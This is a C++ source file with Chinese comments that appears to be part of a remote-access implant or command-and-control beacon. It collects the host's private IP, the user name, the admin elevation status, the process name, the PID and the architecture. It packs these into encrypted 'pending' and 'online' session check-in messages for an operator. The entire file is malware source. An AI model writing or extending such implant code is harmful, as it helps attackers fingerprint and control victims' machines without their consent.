#include <iostream>
#include <ws2tcpip.h>
#include <psapi.h>

#include "Cryptor.h"

using namespace std;

// 获取内网 IP
void GetPrivateIP(char* privateIP) {
    WSADATA lpWSAData;
    if (WSAStartup(MAKEWORD(2, 2), &lpWSAData)) {
        return;
    }
    char hostName[50] = "";
    if (gethostname(hostName, sizeof(hostName))) {
        WSACleanup();
        return;
    }
    addrinfo hint;
    memset(&hint, 0, sizeof(hint));
    hint.ai_family = AF_INET;
    hint.ai_socktype = SOCK_STREAM;
    addrinfo* addrInfo;
    if (getaddrinfo(hostName, NULL, &hint, &addrInfo)) {
        WSACleanup();
        return;
    }
    if (inet_ntop(AF_INET, &(((struct sockaddr_in*)addrInfo->ai_addr)->sin_addr), privateIP, INET_ADDRSTRLEN) == NULL) {
        freeaddrinfo(addrInfo);
        WSACleanup();
        return;
    }
    freeaddrinfo(addrInfo);
    WSACleanup();
}

// 构造“待定会话信息”: 会话类型(0)\0FID,SID,内网IP,XOR1,XOR2,随机数
void ConstructPendingSessionInfo(char* fid, char* sid, char* sessionInfo, int* pSessionInfoLength) {
    // 获取内网 IP
    char privateIP[INET_ADDRSTRLEN] = "Unknown";
    GetPrivateIP(privateIP);

    sprintf_s(sessionInfo, 100, "0%c%s,%s,%s,%d,%d,1", '\0', fid, sid, privateIP, 255, 255);
    *pSessionInfoLength = 2 + strlen(sessionInfo + 2);

    EncryptData(sessionInfo, *pSessionInfoLength);
}

// 构造“正式上线会话信息”: 会话类型(1)\0FID,SID,内网IP,用户名,进程名,PID,位数,随机数
void ConstructSessionInfo(char* fid, char* sid, char* sessionInfo, int* pSessionInfoLength) {
    // 获取内网 IP
    char privateIP[INET_ADDRSTRLEN] = "Unknown";
    GetPrivateIP(privateIP);
    // 获取权限
    DWORD size;
    HANDLE hToken;
    char isAdmin[50] = "";
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        TOKEN_ELEVATION tokenElevation;
        if (GetTokenInformation(hToken, TokenElevation, &tokenElevation, sizeof(tokenElevation), &size)) {
            if (tokenElevation.TokenIsElevated) {
                *isAdmin = '*';
            }
        }
        CloseHandle(hToken);
    }
    // 获取用户名
    char username[50] = "Unknown";
    size = sizeof(username);
    GetUserNameA(username, &size);
    strcat_s(isAdmin, sizeof(isAdmin), username);
    // 获取进程名
    char processName[50] = "Unknown";
    GetModuleBaseNameA(GetCurrentProcess(), NULL, processName, sizeof(processName));
    // 获取 PID
    char pid[10] = "Unknown";
    sprintf_s(pid, sizeof(pid), "%d", GetCurrentProcessId());
    // 获取位数
#if defined(_M_IX86)
    char bit[] = "x86";
#else
    char bit[] = "x64";
#endif

    sprintf_s(sessionInfo, 100, "1%c%s,%s,%s,%s,%s,%s,%s,1", '\0', fid, sid, privateIP, isAdmin, processName, pid, bit);
    *pSessionInfoLength = 2 + strlen(sessionInfo + 2);

    EncryptData(sessionInfo, *pSessionInfoLength);
}